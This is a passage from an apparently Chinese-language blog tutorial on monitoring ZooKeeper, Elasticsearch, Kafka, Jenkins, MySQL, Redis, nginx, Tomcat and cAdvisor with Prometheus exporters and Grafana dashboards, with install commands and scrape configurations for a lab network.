class="hljs-string">&#x27;&#123;job=&quot;promethues&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;job:.*&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;node.*&quot;&#125;&#x27;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.33:9090&quot;</span><br><br>检查配置文件语法<br>[root@prometheus-server31 ~]# check <br><br>重载prometheus server<br>[root@prometheus-server31 ~]# rr<br><br>验证数据是否采集成功<br>http://10.0.0.31:9090/targets<br><br></code></pre></td></tr></table></figure><h2 id="9、监控流程"><a href="#9、监控流程" class="headerlink" title="9、监控流程"></a>9、监控流程</h2><p>普罗米修斯监控可分为两类，云原生应用和非云原生应用。</p><p>云原生应用提供metrics，不需要安装exporters客户端，直接修改配置文件即可</p><p>非云原生应用需要安装exportes客户端，并启动客户端，服务端yaml文件加入客户端ip和端口</p><h2 id="10、监控zookeeper集群"><a href="#10、监控zookeeper集群" class="headerlink" title="10、监控zookeeper集群"></a>10、监控zookeeper集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改zookeeper集群的配置文件<br>[root@elk91 ~]# vim /softwares/apache-zookeeper-3.8.4-bin/conf/zoo.cfg <br>...<br><span class="hljs-comment"># https://prometheus.io Metrics Exporter</span><br>metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider<br>metricsProvider.httpHost=0.0.0.0<br>metricsProvider.httpPort=7000<br>metricsProvider.exportJvmInfo=<span class="hljs-literal">true</span><br>...           <br>[root@elk91 ~]# systemctl restart zk<br><br>测试服务是否正常<br>[root@elk91 ~]# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 91 93`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">stat</span> | nc 10.0.0.<span class="hljs-variable">$i</span> 2181 | grep Mode;<span class="hljs-keyword">done</span><br>Mode: follower<br>Mode: leader<br>Mode: follower<br><br>访问webUI<br>http://10.0.0.91:7000/metrics<br><br>Prometheus server配置监控zookeeper集群<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">tail</span> -6 /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>  - job_name: zookeeper<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:7000<br>      - 10.0.0.92:7000<br>      - 10.0.0.93:7000<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# check<br>重载服务<br>[root@prometheus-server31 ~]# rr<br><br>访问Prometheus的WebUI进行验证<br>http://10.0.0.31:9090/targets<br><br>grafana导入模板<br>10465<br></code></pre></td></tr></table></figure><h2 id="11、客户端下载地址"><a href="#11、客户端下载地址" class="headerlink" title="11、客户端下载地址"></a>11、客户端下载地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">监控应用的流程Prometheus<br>https://prometheus.io/docs/instrumenting/exporters/<br></code></pre></td></tr></table></figure><h2 id="12、监控elasticsearch集群"><a href="#12、监控elasticsearch集群" class="headerlink" title="12、监控elasticsearch集群"></a>12、监控elasticsearch集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载elasticsearch exporter<br>https://github.com/prometheus-community/elasticsearch_exporter/releases/download/v1.7.0/elasticsearch_exporter-1.7.0.linux-amd64.tar.gz<br><br>2.解压软件包 <br>[root@elk91 ~]# tar xf elasticsearch_exporter-1.7.0.linux-amd64.tar.gz <br><br>3.启动测试<br>[root@elk91 elasticsearch_exporter-1.7.0.linux-amd64]# ./elasticsearch_exporter --es.uri=<span class="hljs-string">&quot;http://elastic:123456@10.0.0.93:9200&quot;</span> --web.listen-address=:9114 --web.telemetry-path=<span class="hljs-string">&quot;/metrics&quot;</span> <br><br>4.Prometheus server监控es的exporter<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br><br>  - job_name: elasticsearch<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:9114<br>      <br>[root@prometheus-server31 ~]# rr<br><br>5.查看Prometheus的WebUI是否监控到目标<br>http://10.0.0.31:9090/targets<br><br>6.grafana出图展示<br>14191<br></code></pre></td></tr></table></figure><h2 id="13、监控kafka集群"><a href="#13、监控kafka集群" class="headerlink" title="13、监控kafka集群"></a>13、监控kafka集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.启动kafka集群<br>[root@elk91 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>[root@elk92 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>[root@elk93 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>2.验证kafka服务是否正常<br>[root@elk91 ~]# zkCli.sh <span class="hljs-built_in">ls</span> /kafka371/brokers/ids  | grep <span class="hljs-string">&quot;^\[&quot;</span><br><br>3.下载kafka的exporter<br>wget https://github.com/danielqsj/kafka_exporter/releases/download/v1.7.0/kafka_exporter-1.7.0.linux-amd64.tar.gz<br><br>4.解压目录中指定文件kafka_exporter到指定路径<br>[root@elk91 ~]# tar xf  kafka_exporter-1.7.0.linux-amd64.tar.gz -C /usr/local/bin/ kafka_exporter-1.7.0.linux-amd64/kafka_exporter  --strip-components=1<br><br>5.启动 kafka_exporter<br>[root@elk91 ~]# kafka_exporter --web.listen-address=<span class="hljs-string">&quot;:9308&quot;</span> --web.telemetry-path=<span class="hljs-string">&quot;/metrics&quot;</span>  --kafka.version=<span class="hljs-string">&quot;3.7.1&quot;</span> --kafka.server=10.0.0.93:9092<br><br>6.访问测试kafka的exporter页面<br>http://10.0.0.91:9308/metrics<br><br>7.Prometheus配置监控kafka的exporter<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: kafka<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:9308<br>  <br>[root@prometheus-server31 ~]# rr<br><br>8.查看Prometheus的WebUI是否监控到目标<br>http://10.0.0.31:9090/targets<br><br>9.grafana出图展示<br>12460<br><br>9.测试验证准确信<br>9.1 创建topic<br>[root@elk93 ~]# kafka-topics.sh --bootstrap-server 10.0.0.91:9092 --create --topic xixi --partitions 3 <br>Created topic xixi.<br>[root@elk93 ~]# <br><br><br>9.2 启动消费者<br>[root@elk92 ~]# kafka-console-consumer.sh --bootstrap-server 10.0.0.91:9092  --topic xixi <br><br>9.3 启动生产者<br>[root@elk93 ~]# kafka-console-producer.sh --bootstrap-server 10.0.0.91:9092  --topic xixi<br></code></pre></td></tr></table></figure><h2 id="14、监控Jenkins服务"><a href="#14、监控Jenkins服务" class="headerlink" title="14、监控Jenkins服务"></a>14、监控Jenkins服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.jenkins安装Prometheus插件<br>如果安装插件失败，可以直接导入tar包到/var/lib/jenkins/plugins目录并重启。<br>tar xf jenkins-plugins.tar.gz <br><br>2.验证Jenkins的metrics组件是否生效<br>[root@jenkins211 plugins]# systemctl restart jenkins<br>http://10.0.0.211:8080/prometheus/<br><br>3.验证Jenkins的metrics组件是否生效<br>http://10.0.0.211:8080/prometheus/<br><br>4.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: jenkins<br>    metrics_path: /prometheus<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:8080<br>...<br><br>[root@prometheus-server31 ~]# rr<br><br>5.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>6.导入Jenkins的相关模板<br>9964<br>9524<br>12646<br></code></pre></td></tr></table></figure><h2 id="15、监控mysql服务"><a href="#15、监控mysql服务" class="headerlink" title="15、监控mysql服务"></a>15、监控mysql服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署MySQL<br>[root@jenkins211 ~]# docker run --name mysql-server -d \<br>             -e MYSQL_USER=<span class="hljs-string">&quot;root&quot;</span> \<br>             -e MYSQL_PASSWORD=<span class="hljs-string">&quot;123456&quot;</span> \<br>             -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="hljs-string">&quot;yes&quot;</span> \<br>             --network=host \<br> --restart unless-stopped \<br>             mysql:8.4.2-oracle \<br>             --character-set-server=utf8mb4 --collation-server=utf8mb4_bin <br>             <br>[root@jenkins211 ~]# docker ps -l<br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS     NAMES<br>5db1d0101b5c   mysql:8.3.0-oracle   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   13 seconds ago   Up 13 seconds             mysql-server<br>[root@jenkins211 ~]# <br>[root@jenkins211 ~]# ss -ntl | grep 3306<br>LISTEN 0      151                *:3306             *:*          <br>LISTEN 0      70                 *:33060            *:*   <br><br><br>2.下载mysql exporter <br>wget https://github.com/prometheus/mysqld_exporter/releases/download/v0.15.1/mysqld_exporter-0.15.1.linux-amd64.tar.gz<br><br>3.安装mysql exporters<br>[root@jenkins211 ~]# tar xf mysqld_exporter-0.15.1.linux-amd64.tar.gz -C /usr/local/bin/ mysqld_exporter-0.15.1.linux-amd64/mysqld_exporter  --strip-components=1<br><br>4.准备MySQL的链接认证文件，创建MySQL的配置，指定默认的用户名和密码<br>[root@jenkins211 ~]# <span class="hljs-built_in">cat</span>  ~/.my.cnf <br>[client]<br>user=root<br>password=123456<br><br>5.运行mysqld-exporter<br>[root@jenkins211 ~]# mysqld_exporter --mysqld.address=<span class="hljs-string">&quot;10.0.0.211:3306&quot;</span> --web.listen-address=:9104 --config.my-cnf=<span class="hljs-string">&quot;/root/.my.cnf&quot;</span><br><br>6.访问mysqld_exporter的webUI<br>http://10.0.0.211:9104/metrics<br><br>7.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: mysql<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:9104<br>      <br>[root@prometheus-server31 ~]# rr<br><br>8.查看Prometheus是否监控到数据<br>http://10.0.0.31:9090/targets<br><br>9.grafana出图展示<br>18949<br>17320<br>14057<br></code></pre></td></tr></table></figure><h2 id="16、监控Redis服务"><a href="#16、监控Redis服务" class="headerlink" title="16、监控Redis服务"></a>16、监控Redis服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署Redis<br>[root@jenkins211 ~]# docker run -d --name redis-server --restart always --network host  redis:7.2.5<br><br>2.下载redis-exporter<br>wget https://github.com/oliver006/redis_exporter/releases/download/v1.52.0/redis_exporter-v1.52.0.linux-amd64.tar.gz<br><br>3.解压软件包到PATH路径<br>[root@jenkins211 ~]# tar xf redis_exporter-v1.61.0.linux-amd64.tar.gz -C /usr/local/bin/ redis_exporter-v1.61.0.linux-amd64/redis_exporter --strip-components=1<br>[root@jenkins211 ~]# ll /usr/local/bin/<br><br>4.运行redis-exporter<br>[root@jenkins211 ~]# redis_exporter -web.listen-address=:9121 -web.telemetry-path=/metrics  -redis.addr=redis://10.0.0.211:6379<br><br>5.访问redis-exporter的WebUI<br>http://10.0.0.211:9121/metrics<br><br>6.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: redis<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:9121<br>[root@prometheus-server31 ~]# rr<br><br><br>7.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>8.grafana出图展示<br>763<br>14091<br></code></pre></td></tr></table></figure><h2 id="17、安装grafana插件"><a href="#17、安装grafana插件" class="headerlink" title="17、安装grafana插件"></a>17、安装grafana插件</h2><p><strong>在线安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">grafana的版本为9.5.21<br>软件包下载到/var/lib/grafana/plugins/目录<br><br>[root@prometheus-server31 grafana]# grafana-cli plugins install natel-discrete-panel<br></code></pre></td></tr></table></figure><p><strong>离线安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@grafana71 ~]# wget  https://grafana.com/api/plugins/natel-discrete-panel/versions/latest/download -O /opt/natel-discrete-panel.zip<br><br>[root@prometheus-server31 ~]# unzip natel-discrete-panel-0.1.1.zip -d /var/lib/grafana/plugins/<br><br>[root@prometheus-server31 ~]# systemctl restart grafana-server<br><br>[root@prometheus-server31 ~]# ss -ntl | grep 3000<br>LISTEN 0      4096               *:3000            *:*          <br></code></pre></td></tr></table></figure><h2 id="18、监控nginx服务"><a href="#18、监控nginx服务" class="headerlink" title="18、监控nginx服务"></a>18、监控nginx服务</h2><p><strong>编译安装nginx</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 安装编译工具<br>CentOS：<br>yum -y install git wget gcc make zlib-devel gcc-c++ libtool openssl openssl-devel<br><br>Ubuntu：<br>apt -y install git wget gcc make zlib1g-dev build-essential libtool openssl libssl-dev<br><br>2 克隆nginx-module-vts模块<br>git <span class="hljs-built_in">clone</span> git://github.com/vozlt/nginx-module-vts.git<br>或者<br>git <span class="hljs-built_in">clone</span> https://gitee.com/jasonyin2020/nginx-module-vts.git<br><br>3 下载nginx软件包<br>wget https://nginx.org/download/nginx-1.26.2.tar.gz<br><br>4 解压nginx<br>tar xf nginx-1.26.2.tar.gz<br><br><br>5 配置nginx<br><span class="hljs-built_in">cd</span> nginx-1.26.2<br>./configure --prefix=/softwares/nginx \<br>  --with-http_ssl_module \<br>  --with-http_v2_module \<br>  --with-http_realip_module \<br>  --without-http_rewrite_module \<br>  --with-http_stub_status_module \<br>  --without-http_gzip_module  \<br>  --with-file-aio \<br>  --with-stream \<br>  --with-stream_ssl_module \<br>  --with-stream_realip_module \<br>  --add-module=/root/nginx-module-vts<br><br>6 编译并安装nginx<br>make -j 2 &amp;&amp; make install<br><br>7 修改nginx的配置文件<br>vim /softwares/nginx/conf/nginx.conf<br>...<br>http &#123;<br>    <span class="hljs-comment">#加入编译的status模块，将请求代理到31:9090端口</span><br>    vhost_traffic_status_zone;<br>    upstream promethues &#123;<br>       server 10.0.0.31:9090;<br>    &#125;<br>    ...<br>    server &#123;<br>        ...<br>        location / &#123;<br>            root   html;<br>            <span class="hljs-comment"># index  index.html index.htm;</span><br>            proxy_pass http://promethues;<br>        &#125;<br><br>        location /status &#123;<br>            vhost_traffic_status_display;<br>            vhost_traffic_status_display_format html;<br>        &#125;<br>    &#125;<br>&#125;<br><br>8 检查配置文件语法<br>[root@jenkins211 ~]# /softwares/nginx/sbin/nginx -t<br><br>9 启动nginx<br>[root@jenkins211 ~]# /softwares/nginx/sbin/nginx<br>[root@jenkins211 ~]# <br>[root@jenkins211 ~]# ss -ntl | grep 80<br>LISTEN 0      511          0.0.0.0:80        0.0.0.0:*      <br><br>10 访问nginx的状态页面<br>http://10.0.0.211/status/format/prometheus<br>http://10.0.0.211/status<br></code></pre></td></tr></table></figure><p><strong>安装nginx-vtx-exporter</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载nginx-vtx-exporter,不建议下载最新版本<br>wget https://github.com/hnlq715/nginx-vts-exporter/releases/download/v0.10.3/nginx-vts-exporter-0.10.3.linux-amd64.tar.gz<br><br>2 解压软件包到path路径<br>tar xf nginx-vts-exporter-0.10.3.linux-amd64.tar.gz -C /usr/local/bin/ nginx-vts-exporter-0.10.3.linux-amd64/nginx-vts-exporter --strip-components=1<br><br>3 运行nginx-vtx-exporter<br>[root@jenkins211 ~]# nginx-vts-exporter -nginx.scrape_uri=http://10.0.0.211/status/format/json<br></code></pre></td></tr></table></figure><p><strong>配置prometheus采集nginx数据</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 修改配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;nginx-exporter&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/status/format/prometheus&quot;</span><br>    static_configs:<br>      - targets:<br>          - <span class="hljs-string">&quot;10.0.0.211:80&quot;</span><br><br>  - job_name: <span class="hljs-string">&quot;nginx-vts-exporter&quot;</span><br>    static_configs:<br>      - targets:<br>          - <span class="hljs-string">&quot;10.0.0.211:9913&quot;</span><br>          <br>[root@prometheus-server31 ~]# rr<br><br>2 访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>3 导入grafana模板<br>2949<br></code></pre></td></tr></table></figure><h2 id="19、监控tomcat服务"><a href="#19、监控tomcat服务" class="headerlink" title="19、监控tomcat服务"></a>19、监控tomcat服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 基于Dockerfile构建tomcat-exporter<br>[root@jenkins211 ~]# git <span class="hljs-built_in">clone</span> https://gitee.com/jasonyin2020/tomcat-exporter.git<br><br>2.编译镜像<br>[root@jenkins211 ~]# <span class="hljs-built_in">cd</span> tomcat-exporter/<br>[root@jenkins211 tomcat-exporter]# <span class="hljs-built_in">chmod</span> +x build.sh <br>[root@jenkins211 tomcat-exporter]# ./build.sh <br><br>3 运行tomcat镜像<br>[root@jenkins211 ~]# docker run -dp 18080:8080 --name tomcat-server registry.cn-hangzhou.aliyuncs.com/yinzhengjie-k8s/tomcat9-app:v1<br><br>4.访问tomcat应用<br>http://10.0.0.211:18080/metrics/<br>http://10.0.0.211:18080/myapp/ <br><br>5.配置prometheus监控tomcat应用<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;tomcat-exporter&quot;</span><br>    static_configs:<br>      - targets: <br>          - <span class="hljs-string">&quot;10.0.0.211:18080&quot;</span><br>          <br>5.2 导入grafana模板 <br>https://github.com/nlighten/tomcat_exporter/blob/master/dashboard/example.json<br></code></pre></td></tr></table></figure><h2 id="20、监控容器cadvisor"><a href="#20、监控容器cadvisor" class="headerlink" title="20、监控容器cadvisor"></a>20、监控容器cadvisor</h2><p>它是一个正在运行的守护进程，用于收集、聚合、处理和导出有关正在运行的容器的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">官网地址：https://github.com/google/cadvisor<br><br>导入镜像<br>[root@jenkins211 ~]# docker load -i cadvisor-amd64-0.49.1.tar.gz <br><br>运行容器<br>[root@jenkins211 ~]# <br>VERSION=v0.49.1 <br>docker run \<br>  -v /:/rootfs:ro \<br>  -v /var/run:/var/run:ro \<br>  -v /sys:/sys:ro \<br>  -v /var/lib/docker/:/var/lib/docker:ro \<br>  -v /dev/disk/:/dev/disk:ro \<br>  -p 28080:8080 \<br>  -d \<br>  --name=cadvisor \<br>  --privileged \<br>  --device=/dev/kmsg \<br>  gcr.io/cadvisor/cadvisor-amd64:<span class="hljs-variable">$VERSION</span><br>54149a621e6bcd9a612fc0b3c755eea91d7466b52bf732a92816c22993b2d635<br><br>prometheus采集cAdvisor容器<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml<br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;prometheus-cAdvisor&quot;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.211:28080&quot;</span><br>        <br>[root@prometheus-server31 ~]# rr<br>10.0.0.211:28080/metrics<br><br>访问WebUI验证配置是否生效<br>http://10.0.0.31:9090/targets<br><br>导入grafana模板<br>315  <br>10619<br><br><br>grafana的官方优化思路-对于容器出现小数的情况<br>针对10619模板，当容器数量增多时，如果容器出现小数点，微调即可。<br><br>Value options  ---&gt;  <span class="hljs-string">&quot;Last*&quot;</span><br></code></pre></td></tr></table></figure><h2 